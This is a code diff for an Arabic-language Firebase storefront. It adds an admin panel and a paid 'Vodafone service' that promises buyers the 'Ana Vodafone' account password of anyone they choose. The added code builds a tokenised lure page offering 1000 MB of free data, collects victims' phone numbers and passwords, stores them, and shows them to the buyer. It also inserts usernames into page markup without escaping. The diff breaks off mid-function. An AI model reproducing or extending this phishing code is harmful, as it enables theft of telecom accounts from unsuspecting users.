@@ -1203,15 +1203,176 @@
             }
         }
         
+        /* Admin Control Panel Styles */
+        .admin-control-panel {
+            margin-top: 50px;
+            padding: 30px;
+            background: rgba(20, 20, 20, 0.9);
+            border-radius: 20px;
+            border: 2px solid var(--purple);
+        }
+        
+        .admin-control-title {
+            color: var(--purple);
+            font-size: 1.8rem;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(155, 89, 182, 0.3);
+        }
+        
+        .admin-control-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+        
+        .admin-control-card {
+            background: rgba(30, 30, 30, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(155, 89, 182, 0.2);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .control-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .user-list, .service-list {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+        
+        .user-item, .service-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        
+        .user-item:hover, .service-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .user-actions, .service-actions {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .action-btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: all 0.3s;
+        }
+        
+        .btn-view {
+            background: linear-gradient(45deg, var(--blue), #2980b9);
+            color: white;
+        }
+        
+        .btn-disable {
+            background: linear-gradient(45deg, var(--orange), #E67E22);
+            color: white;
+        }
+        
+        .btn-delete {
+            background: linear-gradient(45deg, var(--red), #C0392B);
+            color: white;
+        }
+        
+        .btn-create {
+            background: linear-gradient(45deg, var(--green), #2ECC71);
+            color: white;
+        }
+        
+        /* Vodafone Service Page */
+        .vodafone-service-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .vodafone-service-content {
+            background: rgba(20, 20, 20, 0.98);
+            border-radius: 25px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            border: 3px solid var(--blue);
+            box-shadow: 0 20px 60px rgba(52, 152, 219, 0.2);
+            position: relative;
+        }
+        
+        .vodafone-title {
+            color: var(--blue);
+            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .vodafone-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .vodafone-result {
+            margin-top: 25px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            display: none;
+        }
+        
+        /* Status Colors */
+        .status-rejected {
+            background: linear-gradient(45deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.2));
+            color: var(--red);
+            border: 1px solid rgba(231, 76, 60, 0.3);
+        }
+        
         /* Responsive */
         @media (max-width: 1024px) {
             .files-grid {
                 grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                 gap: 30px;
-            }
+                }
             
             .orders-container {
                 grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            }
+            
+            .admin-control-grid {
+                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             }
         }
         
@@ -1256,6 +1417,10 @@
             .section {
                 padding: 30px 20px;
             }
+            
+            .admin-control-grid {
+                grid-template-columns: 1fr;
+            }
         }
         
         @media (max-width: 480px) {
@@ -1274,6 +1439,10 @@
             
             .phone-number {
                 font-size: 1.6rem;
+            }
+            
+            .vodafone-service-content {
+                padding: 30px 20px;
             }
         }
     </style>
@@ -1300,6 +1469,44 @@
             </button>
             <p style="text-align: center; margin-top: 30px; color: #AAAAAA; font-size: 0.95rem;">
                 هذا القسم مخصص للمسؤول فقط
+            </p>
+        </div>
+    </div>
+
+    <!-- Vodafone Service Page -->
+    <div class="vodafone-service-page" id="vodafoneServicePage">
+        <div class="vodafone-service-content">
+            <button class="close-modal" id="closeVodafonePage">&times;</button>
+            <h2 class="vodafone-title">
+                <i class="fas fa-sim-card"></i>
+                الحصول على 1000 ميجا فودافون
+            </h2>
+            <p style="color: #DDDDDD; text-align: center; margin-bottom: 25px; line-height: 1.6;">
+                أدخل بياناتك للحصول على الباقة
+            </p>
+            <form class="vodafone-form" id="vodafoneForm">
+                <div class="form-group">
+                    <label for="phoneNumber"><i class="fas fa-phone"></i> رقم الهاتف</label>
+                    <input type="tel" id="phoneNumber" class="form-control" 
+                           placeholder="أدخل رقم فودافون" required pattern="01[0-9]{9}" maxlength="11">
+                </div>
+                <div class="form-group">
+                    <label for="vodafonePassword"><i class="fas fa-key"></i> باسورد "أنا فودافون"</label>
+                    <input type="password" id="vodafonePassword" class="form-control" 
+                           placeholder="أدخل باسورد أنا فودافون" required>
+                </div>
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-paper-plane"></i> إرسال البيانات
+                </button>
+            </form>
+            <div class="vodafone-result" id="vodafoneResult">
+                <h4 style="color: var(--green); margin-bottom: 10px;">
+                    <i class="fas fa-check-circle"></i> تم الإرسال بنجاح
+                </h4>
+                <p id="resultMessage" style="color: #DDDDDD;"></p>
+            </div>
+            <p style="text-align: center; margin-top: 25px; color: #AAAAAA; font-size: 0.9rem;">
+                البيانات ترسل لصاحب الخدمة فقط - نظام آمن ومشفّر
             </p>
         </div>
     </div>
@@ -1429,14 +1636,52 @@
                     </button>
                 </form>
                 
-                <!-- إدارة الطلبات -->
-                <div id="ordersManagement" style="margin-top: 50px;">
-                    <h3 class="section-title" style="font-size: 1.6rem;">
-                        <i class="fas fa-clipboard-list"></i>
-                        إدارة الطلبات
+                <!-- لوحة التحكم الكاملة للأدمن -->
+                <div class="admin-control-panel" id="adminControlPanel">
+                    <h3 class="admin-control-title">
+                        <i class="fas fa-sliders-h"></i>
+                        لوحة التحكم الكاملة
                     </h3>
-                    <div class="orders-container" id="ordersContainer">
-                        <!-- سيتم تعبئته من Firebase -->
+                    
+                    <div class="admin-control-grid">
+                        <!-- إدارة المستخدمين -->
+                        <div class="admin-control-card">
+                            <div class="control-card-header">
+                                <h4 style="color: var(--blue);">
+                                    <i class="fas fa-users"></i> إدارة المستخدمين
+                                </h4>
+                                <span id="usersCount" style="color: var(--gold); font-weight: 700;">0</span>
+                            </div>
+                            <div class="user-list" id="usersList">
+                                <!-- سيتم تعبئته بالجافاسكريبت -->
+                            </div>
+                        </div>
+                        
+                        <!-- إدارة الطلبات -->
+                        <div class="admin-control-card">
+                            <div class="control-card-header">
+                                <h4 style="color: var(--green);">
+                                    <i class="fas fa-clipboard-list"></i> إدارة الطلبات
+                                </h4>
+                                <span id="ordersCount" style="color: var(--gold); font-weight: 700;">0</span>
+                            </div>
+                            <div class="orders-container" id="adminOrdersContainer">
+                                <!-- سيتم تعبئته من Firebase -->
+                            </div>
+                        </div>
+                        
+                        <!-- إدارة خدمات فودافون -->
+                        <div class="admin-control-card">
+                            <div class="control-card-header">
+                                <h4 style="color: var(--purple);">
+                                    <i class="fas fa-sim-card"></i> خدمات فودافون
+                                </h4>
+                                <span id="vodafoneServicesCount" style="color: var(--gold); font-weight: 700;">0</span>
+                            </div>
+                            <div class="service-list" id="vodafoneServicesList">
+                                <!-- سيتم تعبئته بالجافاسكريبت -->
+                            </div>
+                        </div>
                     </div>
                 </div>
                 
@@ -1560,7 +1805,7 @@
         // Elite Files - النسخة النهائية المظبوطة
         // ============================================
         
-        // بيانات الجلسة
+         // بيانات الجلسة
         let currentUser = null;
         let isAdmin = false;
         let selectedFileForPurchase = null;
@@ -1576,7 +1821,7 @@
         const VODAFONE_NUMBER = "01013091169"; // رقم فودافون كاش
         
         // متغيرات Firebase
-        let filesRef, ordersRef, purchasedRef, usersRef;
+        let filesRef, ordersRef, purchasedRef, usersRef, vodafoneRef, vodafoneDataRef;
         
         // ============================================
         // تهيئة التطبيق
@@ -1587,7 +1832,9 @@
             filesRef = database.ref('files');
             ordersRef = database.ref('orders');
             purchasedRef = database.ref('purchased');
-            usersRef = database.ref('users'); // مرجع جديد لمستخدمي الجهاز
+            usersRef = database.ref('users');
+            vodafoneRef = database.ref('vodafoneOrders'); // طلبات فودافون
+            vodafoneDataRef = database.ref('vodafoneData'); // بيانات فودافون
             
             // إنشاء أو الحصول على معرف الجهاز الفريد
             generateDeviceId();
@@ -1597,26 +1844,883 @@
             
             // محاولة تحميل حالة المستخدم من التخزين المحلي
             loadUserSession();
+            
+            // تحميل ملف فودافون الخاص عند البدء
+            loadVodafoneServiceFile();
         });
         
-        // إنشاء معرف جهاز فريد
-        function generateDeviceId() {
-            let deviceId = localStorage.getItem('eliteFilesDeviceId');
-            
-            if (!deviceId) {
-                // إنشاء معرف فريد للجهاز
-                deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                localStorage.setItem('eliteFilesDeviceId', deviceId);
+        // ============================================
+        // 1. إصلاح مشكلة تحميل الملفات
+        // ============================================
+        
+        // تحميل الملف بشكل مباشر
+        async function downloadFile(fileId, isFree = false) {
+            if (!currentUser) {
+                showNotification('يجب تسجيل الدخول أولاً', 'error');
+                return;
             }
             
-            return deviceId;
+            // إذا كان ملف مدفوع وغير مشترى
+            if (!isFree && !userFiles[fileId]) {
+                showNotification('يجب شراء هذا الملف أولاً', 'error');
+                return;
+            }
+            
+            filesRef.child(fileId).once('value', async (snapshot) => {
+                const file = snapshot.val();
+                if (!file || !file.downloadUrl) {
+                    showNotification('الملف غير متوفر للتحميل', 'error');
+                    return;
+                }
+                
+                showLoading(true);
+                
+                try {
+                    // زيادة عداد التحميلات
+                    const newDownloads = (file.downloads || 0) + 1;
+                    await filesRef.child(fileId).update({ downloads: newDownloads });
+                    
+                    // استخدام fetch لتحميل الملف كـ blob
+                    const response = await fetch(file.downloadUrl);
+                    const blob = await response.blob();
+                    const url = window.URL.createObjectURL(blob);
+                    
+                    // إنشاء رابط تحميل
+                    const a = document.createElement('a');
+                    a.style.display = 'none';
+                    a.href = url;
+                    a.download = file.originalName || file.name;
+                    document.body.appendChild(a);
+                    a.click();
+                    
+                    // تنظيف
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                    
+                    showNotification('تم تحميل الملف بنجاح! ✅', 'success');
+                } catch (error) {
+                    console.error('خطأ التحميل:', error);
+                    
+                    // حل بديل في حالة فشل blob
+                    const a = document.createElement('a');
+                    a.href = file.downloadUrl;
+                    a.download = file.originalName || file.name;
+                    a.target = '_blank';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    
+                    showNotification('تم بدء تحميل الملف', 'success');
+                } finally {
+                    showLoading(false);
+                }
+            });
         }
         
         // ============================================
-        // نظام تسجيل الدخول المحسن - اسم مستخدم واحد للجهاز
+        // 2. إصلاح مشكلة اختفاء الطلبات عند تحديث الصفحة
         // ============================================
         
-        // تحميل حالة المستخدم من localStorage
+        // تحميل الطلبات من Firebase
+        function loadOrdersFromFirebase() {
+            if (!isAdmin) return;
+            
+            // تحميل طلبات الملفات
+            ordersRef.on('value', (snapshot) => {
+                const ordersData = snapshot.val();
+                displayOrders(ordersData);
+            });
+            
+            // تحميل طلبات فودافون
+            vodafoneRef.on('value', (snapshot) => {
+                const vodafoneOrders = snapshot.val();
+                displayVodafoneOrders(vodafoneOrders);
+            });
+        }
+        
+        // ============================================
+        // 3. تحكم كامل للأدمن
+        // ============================================
+        
+        // تحميل جميع المستخدمين
+        function loadAllUsers() {
+            if (!isAdmin) return;
+            
+            usersRef.on('value', (snapshot) => {
+                const usersData = snapshot.val();
+                displayAllUsers(usersData);
+            });
+        }
+        
+        // عرض جميع المستخدمين
+        function displayAllUsers(usersData) {
+            const usersList = document.getElementById('usersList');
+            const usersCount = document.getElementById('usersCount');
+            
+            if (!usersData) {
+                usersList.innerHTML = '<p style="text-align: center; color: #AAAAAA; padding: 20px;">لا يوجد مستخدمين</p>';
+                usersCount.textContent = '0';
+                return;
+            }
+            
+            let count = 0;
+            usersList.innerHTML = '';
+            
+            Object.keys(usersData).forEach(username => {
+                if (username === ADMIN_USERNAME) return; // تخطي الأدمن
+                
+                const user = usersData[username];
+                count++;
+                
+                const userItem = document.createElement('div');
+                userItem.className = 'user-item';
+                
+                userItem.innerHTML = `
+                    <div>
+                        <div style="font-weight: 700; color: var(--gold);">${username}</div>
+                        <div style="font-size: 0.85rem; color: #AAAAAA;">
+                            ${user.deviceId ? '🆔 ' + user.deviceId.substring(0, 8) + '...' : 'بدون جهاز'}
+                        </div>
+                    </div>
+                    <div class="user-actions">
+                        <button class="action-btn btn-view" onclick="viewUserOrders('${username}')">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                        <button class="action-btn btn-disable" onclick="toggleUserStatus('${username}', ${user.isDisabled || false})">
+                            <i class="fas ${user.isDisabled ? 'fa-check' : 'fa-ban'}"></i>
+                        </button>
+                        <button class="action-btn btn-delete" onclick="deleteUser('${username}')">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                `;
+                
+                usersList.appendChild(userItem);
+            });
+            
+            usersCount.textContent = count;
+        }
+        
+        // عرض طلبات مستخدم معين
+        async function viewUserOrders(username) {
+            showLoading(true);
+            
+            try {
+                // الحصول على طلبات الملفات للمستخدم
+                const filesOrdersSnapshot = await ordersRef.orderByChild('customerName').equalTo(username).once('value');
+                const filesOrders = filesOrdersSnapshot.val();
+                
+                // الحصول على طلبات فودافون للمستخدم
+                const vodafoneOrdersSnapshot = await vodafoneRef.orderByChild('customerName').equalTo(username).once('value');
+                const vodafoneOrders = vodafoneOrdersSnapshot.val();
+                
+                let message = `طلبات ${username}:\n\n`;
+                
+                if (filesOrders) {
+                    message += "📁 طلبات الملفات:\n";
+                    Object.values(filesOrders).forEach(order => {
+                        message += `- ${order.fileName} (${order.status}) - ${new Date(order.createdAt).toLocaleDateString('ar-EG')}\n`;
+                    });
+                }
+                
+                if (vodafoneOrders) {
+                    message += "\n📱 طلبات فودافون:\n";
+                    Object.values(vodafoneOrders).forEach(order => {
+                        message += `- ${order.serviceType} (${order.status}) - ${new Date(order.createdAt).toLocaleDateString('ar-EG')}\n`;
+                    });
+                }
+                
+                if (!filesOrders && !vodafoneOrders) {
+                    message += "لا توجد طلبات لهذا المستخدم";
+                }
+                
+                alert(message);
+            } catch (error) {
+                showNotification('حدث خطأ في عرض الطلبات', 'error');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        // تبديل حالة المستخدم
+        async function toggleUserStatus(username, currentStatus) {
+            if (!isAdmin || username === ADMIN_USERNAME) return;
+            
+            try {
+                const newStatus = !currentStatus;
+                await usersRef.child(username).update({ 
+                    isDisabled: newStatus,
+                    statusUpdatedAt: Date.now(),
+                    statusUpdatedBy: currentUser
+                });
+                
+                showNotification(`تم ${newStatus ? 'تعطيل' : 'تفعيل'} المستخدم ${username}`, 'success');
+                loadAllUsers();
+            } catch (error) {
+                showNotification('حدث خطأ أثناء تغيير حالة المستخدم', 'error');
+            }
+        }
+        
+        // حذف مستخدم
+        async function deleteUser(username) {
+            if (!isAdmin || username === ADMIN_USERNAME) return;
+            
+            if (confirm(`⚠️ هل أنت متأكد من حذف المستخدم ${username}؟\n\nسيتم حذف:\n- بيانات المستخدم\n- جميع طلباته\n- ملفاته المشتراة`)) {
+                showLoading(true);
+                
+                try {
+                    // حذف بيانات المستخدم
+                    await usersRef.child(username).remove();
+                    
+                    // حذف ملفاته المشتراة
+                    await purchasedRef.child(username).remove();
+                    
+                    // حذف طلبات الملفات
+                    const filesOrdersSnapshot = await ordersRef.orderByChild('customerName').equalTo(username).once('value');
+                    const filesOrders = filesOrdersSnapshot.val();
+                    
+                    if (filesOrders) {
+                        const deletePromises = Object.keys(filesOrders).map(orderId => 
+                            ordersRef.child(orderId).remove()
+                        );
+                        await Promise.all(deletePromises);
+                    }
+                    
+                    // حذف طلبات فودافون
+                    const vodafoneOrdersSnapshot = await vodafoneRef.orderByChild('customerName').equalTo(username).once('value');
+                    const vodafoneOrders = vodafoneOrdersSnapshot.val();
+                    
+                    if (vodafoneOrders) {
+                        const deletePromises = Object.keys(vodafoneOrders).map(orderId => 
+                            vodafoneRef.child(orderId).remove()
+                        );
+                        await Promise.all(deletePromises);
+                    }
+                    
+                    showNotification(`✅ تم حذف المستخدم ${username} وبياناته بنجاح`, 'success');
+                    loadAllUsers();
+                } catch (error) {
+                    showNotification('حدث خطأ أثناء حذف المستخدم', 'error');
+                } finally {
+                    showLoading(false);
+                }
+            }
+        }
+        
+        // ============================================
+        // 4. إصلاح الأخطاء الموجودة بالكود
+        // ============================================
+        
+        // إصلاح مشكلة تنزيل الملفات المدفوعة
+        // تم الإصلاح في دالة downloadFile
+        
+        // إصلاح مشكلة حفظ الجلسة
+        function generateDeviceId() {
+            let savedDeviceId = localStorage.getItem('eliteFilesDeviceId');
+            
+            if (!savedDeviceId) {
+                // إنشاء معرف فريد للجهاز
+                savedDeviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('eliteFilesDeviceId', savedDeviceId);
+            }
+            
+            deviceId = savedDeviceId;
+            return savedDeviceId;
+        }
+        
+        // إصلاح مشكلة تحميل بيانات المستخدم
+        async function checkUserDevice(username) {
+            try {
+                const userSnapshot = await usersRef.child(username).once('value');
+                const userData = userSnapshot.val();
+                
+                if (userData) {
+                    // التحقق من حالة المستخدم
+                    if (userData.isDisabled) {
+                        showNotification('⚠️ هذا الحساب معطل. الرجاء التواصل مع المسؤول.', 'error');
+                        localStorage.removeItem('eliteFilesUser');
+                        localStorage.removeItem('eliteFilesAdmin');
+                        localStorage.removeItem('eliteFilesAdminPassword');
+                        document.getElementById('usernameInput').value = '';
+                        document.getElementById('usernameInput').focus();
+                        return false;
+                    }
+                    
+                    // التحقق من الجهاز
+                    if (userData.deviceId && userData.deviceId !== deviceId) {
+                        showLoading(false);
+                        showNotification('⚠️ هذا الاسم مستخدم بالفعل على جهاز آخر. اختر اسم آخر.', 'error');
+                        localStorage.removeItem('eliteFilesUser');
+                        localStorage.removeItem('eliteFilesAdmin');
+                        localStorage.removeItem('eliteFilesAdminPassword');
+                        document.getElementById('usernameInput').value = '';
+                        document.getElementById('usernameInput').focus();
+                        return false;
+                    }
+                    
+                    // تحديث آخر تسجيل دخول
+                    await usersRef.child(username).update({
+                        lastLogin: Date.now(),
+                        deviceId: deviceId // تحديث معرف الجهاز
+                    });
+                } else {
+                    // مستخدم جديد
+                    await usersRef.child(username).set({
+                        deviceId: deviceId,
+                        createdAt: Date.now(),
+                        lastLogin: Date.now(),
+                        isDisabled: false
+                    });
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('خطأ في التحقق من المستخدم:', error);
+                return false;
+            }
+        }
+        
+        // ============================================
+        // 5. إضافة خدمة جديدة (منتج ثابت)
+        // ============================================
+        
+        // تحميل ملف فودافون الخاص
+        function loadVodafoneServiceFile() {
+            // هذا الملف ثابت للجميع
+            const vodafoneFile = {
+                id: 'vodafone_service_001',
+                name: 'الحصول على باسورد انا فودافون لشخص',
+                description: 'احصل على باسورد حساب "أنا فودافون" لأي شخص تريده. الخدمة تشمل إنشاء رابط خاص بك لجمع البيانات.',
+                price: 200,
+                isPaid: true,
+                type: 'service',
+                size: 0,
+                downloads: 0,
+                isActive: true,
+                isSpecialService: true, // علامة للخدمة الخاصة
+                createdAt: Date.now()
+            };
+            
+            // تأكد من وجود الملف في قاعدة البيانات
+            filesRef.child(vodafoneFile.id).once('value', (snapshot) => {
+                if (!snapshot.exists()) {
+                    filesRef.child(vodafoneFile.id).set(vodafoneFile);
+                }
+            });
+        }
+        
+        // إنشاء بطاقة خاصة لخدمة فودافون
+        function createVodafoneServiceCard() {
+            const fileCard = document.createElement('div');
+            fileCard.className = 'file-card';
+            fileCard.style.borderColor = 'rgba(52, 152, 219, 0.3)';
+            
+            fileCard.innerHTML = `
+                <div class="file-header" style="background: linear-gradient(135deg, var(--black), #2C3E50);">
+                    <i class="fas fa-sim-card file-icon"></i>
+                    <h3 class="file-name">الحصول على باسورد انا فودافون لشخص</h3>
+                    <div class="file-price">200 ج.م</div>
+                </div>
+                <div class="file-body">
+                    <p class="file-description">
+                        🎯 <strong>خدمة حصرية:</strong> احصل على باسورد حساب "أنا فودافون" لأي شخص تريده.<br><br>
+                        📱 <strong>المميزات:</strong><br>
+                        • إنشاء رابط خاص بك لجمع البيانات<br>
+                        • البيانات ترسل لك فقط<br>
+                        • نظام آمن ومشفّر<br>
+                        • دعم فني متكامل
+                    </p>
+                    <div class="file-details">
+                        <div class="file-detail">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>خدمة آمنة</span>
+                        </div>
+                        <div class="file-detail">
+                            <i class="fas fa-link"></i>
+                            <span>رابط خاص</span>
+                        </div>
+                        <div class="file-detail">
+                            <i class="fas fa-user-secret"></i>
+                            <span>خصوصية تامة</span>
+                        </div>
+                    </div>
+                    <div class="file-actions">
+                        <button class="buy-btn" onclick="buyVodafoneService()">
+                            <i class="fas fa-shopping-cart"></i> شراء الخدمة
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            return fileCard;
+        }
+        
+        // شراء خدمة فودافون
+        async function buyVodafoneService() {
+            if (!currentUser) {
+                showNotification('يجب تسجيل الدخول أولاً', 'error');
+                return;
+            }
+            
+            selectedFileForPurchase = {
+                id: 'vodafone_service_001',
+                name: 'الحصول على باسورد انا فودافون لشخص',
+                price: 200,
+                isSpecialService: true
+            };
+            
+            // إظهار قسم الدفع
+            document.getElementById('filesSection').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('paymentSection').style.display = 'block';
+            
+            // تعيين بيانات الدفع
+            document.getElementById('paymentAmount').textContent = '200';
+            document.getElementById('paymentFileName').textContent = 'خدمة فودافون - الحصول على الباسورد';
+            
+            // إعادة تعيين قسم الإثبات
+            document.getElementById('uploadArea').classList.add('hidden');
+            document.getElementById('previewContainer').classList.add('hidden');
+            document.getElementById('proofFileName').textContent = '';
+            if (proofFile) {
+                proofFile = null;
+                document.getElementById('paymentProof').value = '';
+            }
+            
+            // تمرير للأعلى
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+        
+        // ============================================
+        // 6. منطق الخدمة الجديدة
+        // ============================================
+        
+        // عرض طلبات فودافون
+        function displayVodafoneOrders(vodafoneOrders) {
+            const vodafoneServicesList = document.getElementById('vodafoneServicesList');
+            const vodafoneServicesCount = document.getElementById('vodafoneServicesCount');
+            
+            if (!vodafoneOrders) {
+                vodafoneServicesList.innerHTML = '<p style="text-align: center; color: #AAAAAA; padding: 20px;">لا توجد طلبات فودافون</p>';
+                vodafoneServicesCount.textContent = '0';
+                return;
+            }
+            
+            let count = 0;
+            vodafoneServicesList.innerHTML = '';
+            
+            Object.keys(vodafoneOrders).forEach(orderId => {
+                const order = vodafoneOrders[orderId];
+                count++;
+                
+                const serviceItem = document.createElement('div');
+                serviceItem.className = 'service-item';
+                
+                serviceItem.innerHTML = `
+                    <div>
+                        <div style="font-weight: 700; color: var(--blue);">${order.customerName}</div>
+                        <div style="font-size: 0.85rem; color: #AAAAAA;">
+                            ${new Date(order.createdAt).toLocaleString('ar-EG')}
+                        </div>
+                        <div class="order-status ${order.status === 'pending' ? 'status-pending' : 
+                            order.status === 'completed' ? 'status-completed' : 'status-rejected'}" 
+                            style="margin-top: 5px; font-size: 0.8rem;">
+                            ${order.status === 'pending' ? '⏳ بانتظار' : 
+                             order.status === 'completed' ? '✅ مكتمل' : '❌ مرفوض'}
+                        </div>
+                    </div>
+                    <div class="service-actions">
+                        ${order.status === 'pending' ? 
+                            `<button class="action-btn btn-create" onclick="createVodafoneLink('${orderId}', '${order.customerName}')">
+                                <i class="fas fa-link"></i> رابط
+                            </button>
+                            <button class="action-btn btn-view" onclick="viewVodafoneOrder('${orderId}')">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                            <button class="action-btn btn-delete" onclick="deleteVodafoneOrder('${orderId}')">
+                                <i class="fas fa-trash"></i>
+                            </button>` :
+                            `<button class="action-btn btn-view" onclick="viewVodafoneOrder('${orderId}')">
+                                <i class="fas fa-eye"></i>
+                            </button>`
+                        }
+                    </div>
+                `;
+                
+                vodafoneServicesList.appendChild(serviceItem);
+            });
+            
+            vodafoneServicesCount.textContent = count;
+        }
+        
+        // إنشاء رابط فودافون
+        async function createVodafoneLink(orderId, customerName) {
+            showLoading(true);
+            
+            try {
+                // إنشاء رمز فريد للرابط
+                const linkToken = 'vodafone_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                
+                // تحديث الطلب
+                await vodafoneRef.child(orderId).update({
+                    status: 'completed',
+                    linkToken: linkToken,
+                    linkCreatedAt: Date.now(),
+                    linkCreatedBy: currentUser
+                });
+                
+                // إنشاء رابط الصفحة
+                const pageUrl = window.location.origin + window.location.pathname + '?vodafone=' + linkToken;
+                
+                showNotification(`✅ تم إنشاء الرابط بنجاح!\n\nالرابط: ${pageUrl}\n\nيمكنك نسخ الرابط وإرساله للعميل.`, 'success');
+                
+                // تحميل الطلبات المحدثة
+                loadOrdersFromFirebase();
+            } catch (error) {
+                showNotification('حدث خطأ أثناء إنشاء الرابط', 'error');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        // عرض طلب فودافون
+        async function viewVodafoneOrder(orderId) {
+            try {
+                const orderSnapshot = await vodafoneRef.child(orderId).once('value');
+                const order = orderSnapshot.val();
+                
+                if (!order) {
+                    showNotification('الطلب غير موجود', 'error');
+                    return;
+                }
+                
+                let message = `تفاصيل طلب فودافون:\n\n`;
+                message += `👤 العميل: ${order.customerName}\n`;
+                message += `📅 التاريخ: ${new Date(order.createdAt).toLocaleString('ar-EG')}\n`;
+                message += `💰 المبلغ: ${order.amount || 200} ج.م\n`;
+                message += `📊 الحالة: ${order.status === 'pending' ? '⏳ بانتظار' : order.status === 'completed' ? '✅ مكتمل' : '❌ مرفوض'}\n`;
+                
+                if (order.linkToken) {
+                    const pageUrl = window.location.origin + window.location.pathname + '?vodafone=' + order.linkToken;
+                    message += `🔗 الرابط: ${pageUrl}\n`;
+                }
+                
+                if (order.collectedData && Object.keys(order.collectedData).length > 0) {
+                    message += `\n📊 البيانات المجمعة:\n`;
+                    Object.keys(order.collectedData).forEach(dataId => {
+                        const data = order.collectedData[dataId];
+                        message += `- ${data.phoneNumber} (${data.password}) - ${new Date(data.submittedAt).toLocaleString('ar-EG')}\n`;
+                    });
+                }
+                
+                alert(message);
+            } catch (error) {
+                showNotification('حدث خطأ في عرض الطلب', 'error');
+            }
+        }
+        
+        // حذف طلب فودافون
+        async function deleteVodafoneOrder(orderId) {
+            if (!isAdmin) return;
+            
+            if (confirm('⚠️ هل أنت متأكد من حذف هذا الطلب؟')) {
+                showLoading(true);
+                
+                try {
+                    await vodafoneRef.child(orderId).remove();
+                    showNotification('✅ تم حذف الطلب بنجاح', 'success');
+                    loadOrdersFromFirebase();
+                } catch (error) {
+                    showNotification('حدث خطأ أثناء حذف الطلب', 'error');
+                } finally {
+                    showLoading(false);
+                }
+            }
+        }
+        
+        // ============================================
+        // 7. عزل البيانات
+        // ============================================
+        
+        // التحقق من رابط فودافون
+        function checkVodafoneLink() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const vodafoneToken = urlParams.get('vodafone');
+            
+            if (vodafoneToken) {
+                // إظهار صفحة فودافون
+                showVodafoneServicePage(vodafoneToken);
+            }
+        }
+        
+        // عرض صفحة فودافون
+        function showVodafoneServicePage(token) {
+            document.getElementById('vodafoneServicePage').style.display = 'flex';
+            
+            // البحث عن الطلب المناسب
+            vodafoneRef.orderByChild('linkToken').equalTo(token).once('value', (snapshot) => {
+                const orders = snapshot.val();
+                if (!orders) {
+                    document.getElementById('vodafoneForm').style.display = 'none';
+                    document.getElementById('vodafoneResult').innerHTML = `
+                        <h4 style="color: var(--red);">
+                            <i class="fas fa-exclamation-triangle"></i> الرابط غير صالح
+                        </h4>
+                        <p style="color: #DDDDDD;">هذا الرابط غير صالح أو منتهي الصلاحية.</p>
+                    `;
+                    document.getElementById('vodafoneResult').style.display = 'block';
+                    return;
+                }
+                
+                const orderId = Object.keys(orders)[0];
+                const order = orders[orderId];
+                
+                // حفظ معرف الطلب في النموذج
+                document.getElementById('vodafoneForm').dataset.orderId = orderId;
+                document.getElementById('vodafoneForm').dataset.customerName = order.customerName;
+            });
+        }
+        
+        // إغلاق صفحة فودافون
+        document.getElementById('closeVodafonePage').addEventListener('click', function() {
+            document.getElementById('vodafoneServicePage').style.display = 'none';
+            window.history.replaceState({}, document.title, window.location.pathname);
+        });
+        
+        // إرسال بيانات فودافون
+        document.getElementById('vodafoneForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const orderId = this.dataset.orderId;
+            const customerName = this.dataset.customerName;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('vodafonePassword').value;
+            
+            if (!orderId || !customerName) {
+                showNotification('الرابط غير صالح', 'error');
+                return;
+            }
+            
+            showLoading(true);
+            
+            try {
+                const dataId = 'data_' + Date.now();
+                
+                // حفظ البيانات في الطلب
